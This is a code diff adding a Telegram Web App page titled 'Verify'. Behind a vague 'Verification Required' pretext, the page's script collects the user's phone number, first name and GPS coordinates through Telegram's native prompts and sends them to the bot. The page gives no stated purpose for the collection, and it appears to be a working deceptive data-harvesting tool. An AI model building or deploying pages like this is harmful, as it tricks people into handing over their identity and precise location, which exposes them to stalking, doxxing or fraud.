@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verify</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: -apple-system, sans-serif;
+      background: var(--tg-theme-bg-color, #fff);
+      color: var(--tg-theme-text-color, #000);
+      text-align: center;
+      padding: 40px 20px;
+    }
+    h2 { margin-top: 30px; }
+    p { color: var(--tg-theme-hint-color, #888); }
+    button {
+      background: var(--tg-theme-button-color, #2481cc);
+      color: var(--tg-theme-button-text-color, #fff);
+      border: none;
+      padding: 15px 40px;
+      font-size: 18px;
+      border-radius: 10px;
+      margin-top: 30px;
+      cursor: pointer;
+      width: 80%;
+    }
+    button:disabled { opacity: 0.5; }
+    .status { margin-top: 25px; font-size: 15px; }
+    .ok { color: #2ecc71; }
+    .err { color: #e74c3c; }
+  </style>
+</head>
+<body>
+  <h2>🔐 Verification Required</h2>
+  <p>Please share your phone number and location to continue.</p>
+  <button id="verifyBtn">Verify Now</button>
+  <div class="status" id="status"></div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+
+    const status = document.getElementById('status');
+    const btn = document.getElementById('verifyBtn');
+
+    btn.addEventListener('click', async () => {
+      btn.disabled = true;
+      status.textContent = 'Requesting phone number...';
+      status.className = 'status';
+
+      // Step 1: Request phone number via Telegram native popup
+      tg.requestContact((ok, event) => {
+        if (!ok) {
+          status.textContent = '❌ Phone number permission denied.';
+          status.className = 'status err';
+          btn.disabled = false;
+          return;
+        }
+        const phone = event.responseUnsafe.contact.phone_number;
+        const firstName = event.responseUnsafe.contact.first_name || '';
+        status.textContent = '✅ Phone received. Requesting location...';
+
+        // Step 2: Request GPS location
+        tg.LocationManager.init(() => {
+          tg.LocationManager.getLocation((locOk, locData) => {
+            if (!locOk) {
+              status.textContent = '❌ Location permission denied.';
+              status.className = 'status err';
+              btn.disabled = false;
+              return;
+            }
+            const lat = locData.latitude;
+            const lon = locData.longitude;
+
+            // Step 3: Send data back to bot
+            const payload = {
+              phone: phone,
+              first_name: firstName,
+              lat: lat,
+              lon: lon
+            };
+            tg.sendData(JSON.stringify(payload));
+            status.textContent = '✅ Verified! You can close this window.';
+            status.className = 'status ok';
+            setTimeout(() => tg.close(), 1500);
+          });
+        });
+      });
+    });
+  </script>
+</body>
+</html>
